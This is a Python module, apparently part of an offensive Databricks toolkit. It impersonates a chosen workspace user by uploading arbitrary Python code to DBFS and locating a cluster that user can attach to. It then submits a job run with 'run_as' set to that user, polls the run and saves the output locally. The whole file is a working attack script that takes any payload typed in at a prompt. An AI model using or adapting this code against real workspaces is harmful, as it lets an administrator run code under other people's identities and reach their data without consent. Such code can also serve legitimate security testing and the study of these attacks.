REQUIRES_WORKSPACE_ADMIN = True

import json
import time
import base64
from core.utils import get, post, safe_json
from config import workspace_url, log

def upload_payload_to_dbfs(payload_code, dbfs_path="/tmp/payload.py"):
    log(f"[*] Uploading payload to DBFS: {dbfs_path}")
    #content = payload_code.encode("utf-8")
    encoded = base64.b64encode(payload_code.encode()).decode()
    put_url = f"{workspace_url}/api/2.0/dbfs/put"
    resp = post(put_url, json={"path": dbfs_path, "contents": encoded, "overwrite": True})
    if resp.status_code == 200:
        log("[+] Payload uploaded successfully.")
    else:
        log("[!] Failed to upload payload.", level="error", always_print=True)

def find_accessible_cluster(target_eid):
    log("[*] Looking for a shared cluster the user can run on...")
    clusters_url = f"{workspace_url}/api/2.0/clusters/list"
    clusters = safe_json(get(clusters_url)).get("clusters", [])

    for cluster in clusters:
        cluster_id = cluster.get("cluster_id")
        state = cluster.get("state")
        if state not in ["RUNNING", "TERMINATED"]:
            continue

        acl_url = f"{workspace_url}/api/2.0/permissions/clusters/{cluster_id}"
        acl_data = safe_json(get(acl_url))
        for entry in acl_data.get("access_control_list", []):
            if entry.get("user_name", "").lower() == target_eid.lower():
                permissions = [p.get("permission_level") for p in entry.get("all_permissions", [])]
                if "CAN_ATTACH_TO" in permissions or "CAN_MANAGE" in permissions:
                    log(f"[+] Found cluster: {cluster['cluster_name']} ({cluster_id})")
                    return cluster_id

    log("[!] No accessible cluster found for user.", level="error", always_print=True)
    return None

def submit_impersonation_job(target_eid, cluster_id, dbfs_payload_path="/tmp/payload.py"):
    log(f"[*] Submitting job to impersonate: {target_eid}")
    job_url = f"{workspace_url}/api/2.1/jobs/runs/submit"

    payload = {
        "run_name": "ImpersonationJob",
        "existing_cluster_id": cluster_id,
        "run_as": {
            "user_name": target_eid
        },
        "spark_python_task": {
            "python_file": f"dbfs:{dbfs_payload_path}"
        }
    }

    resp = post(job_url, json=payload)
    data = safe_json(resp)
    run_id = data.get("run_id")
    if run_id:
        log(f"[+] Job submitted successfully. Run ID: {run_id}")
        return run_id
    else:
        log("[!] Failed to submit job.", level="error", always_print=True)
        return None

def get_job_output(run_id):
    log("[*] Fetching job output...")
    output_url = f"{workspace_url}/api/2.1/jobs/runs/get-output"
    resp = get(output_url, params={"run_id": run_id})
    data = safe_json(resp)
    logs = data.get("notebook_output", {}).get("result") or data.get("logs") or "[No output available]"
    log("\n[+] Job Output:\n" + logs, always_print=True)
    try:
        with open(f"impersonation_output_{run_id}.txt", "w") as f:
            f.write(logs)
        log(f"[+] Output saved to impersonation_output_{run_id}.txt")
    except Exception as e:
        log(f"[!] Failed to save output: {e}", level="error", always_print=True)

def monitor_job(run_id):
    log("[*] Monitoring job status...")
    status_url = f"{workspace_url}/api/2.1/jobs/runs/get"
    for _ in range(20):
        time.sleep(5)
        resp = get(status_url, params={"run_id": run_id})
        data = safe_json(resp)
        state = data.get("state", {}).get("life_cycle_state")
        result_state = data.get("state", {}).get("result_state")
        log(f"[~] State: {state}, Result: {result_state}")
        if state in ["TERMINATED", "SKIPPED", "INTERNAL_ERROR"]:
            break
    log("[+] Job monitoring completed.")
    get_job_output(run_id)

'''
def impersonate_user_via_job(target_eid):
    user_input = input("Enter Python payload code (or leave blank for default): ")
    sample_payload = user_input.strip() if user_input.strip() else "import getpass\nprint('Running as:', getpass.getuser())"
    dbfs_path = "/tmp/payload.py"
    upload_payload_to_dbfs(sample_payload, dbfs_path=dbfs_path)
    cluster_id = find_accessible_cluster(target_eid)
    if not cluster_id:
        return
    run_id = submit_impersonation_job(target_eid, cluster_id, dbfs_payload_path=dbfs_path)
    if run_id:
        monitor_job(run_id)
'''

def impersonate_user_via_job(target_eid):
    print("Enter Python payload code (or leave blank for default). End input with a line containing only 'END':")
    lines = []
    while True:
        line = input()
        if line.strip() == "END":
            break
        lines.append(line)
    user_payload = "\n".join(lines).strip()

    # Default payload if none entered
    if not user_payload:
        user_payload = (
            "import getpass\n"
            "print('Running as:', getpass.getuser())"
        )

    dbfs_path = "/tmp/payload.py"
    upload_payload_to_dbfs(user_payload, dbfs_path=dbfs_path)

    cluster_id = find_accessible_cluster(target_eid)
    if not cluster_id:
        return

    run_id = submit_impersonation_job(target_eid, cluster_id, dbfs_payload_path=dbfs_path)
    if run_id:
        monitor_job(run_id)
